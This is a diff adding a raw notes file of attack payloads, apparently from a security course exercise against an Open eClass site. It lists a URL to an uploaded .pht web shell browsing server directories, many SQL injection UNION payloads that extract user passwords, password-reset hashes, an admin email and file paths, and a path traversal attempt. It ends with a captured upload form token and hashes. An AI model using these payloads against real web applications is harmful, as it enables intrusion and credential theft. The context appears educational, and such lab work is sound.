@@ -1,0 +1,54 @@
+http://avadahackdavra.csec.chatzi.org/77/user1l%20user1f%20627b0b299f9d04.10874133.pht?act=ls&d=%2Fvar%2Fwww%2Fopeneclass%2Fcourses%2FTMA100%2Fwork%2F62732765e5fc7&sort=0a
+
+
+pp' UNION SELECT password from user where user_id='1
+
+
+pp' UNION SELECT secret_directory FROM TMA100.assignments WHERE id = '1
+
+62732765e5fc7
+
+pp' UNION SELECT file_path FROM TMA100.assignment_submit WHERE assignment_id = '../../../../78
+
+62732765e5fc7/user1l user1f 627ac9a1d1b545.98304374.doc
+
+pp' UNION SELECT filename FROM TMA100.dropbox_file WHERE uploaderID='3' and id='2
+
+62795059k03p.phps
+
+
+pp' UNION SELECT email FROM user WHERE username='drunkadmin
+
+pp' UNION SELECT hash from passwd_reset where user_id='1
+
+
+pp' UNION SELECT password as hash, '1' as user_id from user WHERE user_id='1
+
+
+SELECT `user_id`, `hash`, `password`, `datetime` FROM passwd_reset
+WHERE `user_id` = ? AND `hash` = 1' UNION(SELECT ) AND TIME_TO_SEC(TIMEDIFF(`datetime`,NOW())) < 3600
+
+
+SELECT `user_id`, `hash`, `password`, `datetime` FROM passwd_reset
+			WHERE `user_id` =4 and hash=pp' UNION SELECT 1 as user_id, hash, password, datetime from passwd_reset where user_id='3
+
+
+pp' UNION SELECT hash from passwd_reset where user_id='3
+
+gobo130
+
+
+
+
+
+<form enctype="multipart/form-data" action="work.php" method="post"><input type="hidden" name="id" value="1"><input type="file" name="userfile" class="FormData_InputText"><textarea name="stud_comments" rows="5" cols="55" class="FormData_InputText"></textarea><input type="hidden" name="token" value="63ffd888ed6056ff6fffa0c9e39d2ec9018d03bba517f5bb7a7b38095ee0f658"><input type="submit" value="Υποβολή" name="work_submit"></form>
+
+
+
+
+6e07117f2afb0c557b4c5253b3a752fb id change pass hash
+
+
+
+d1c305b12cf91be733a92744d2adb8fb
+
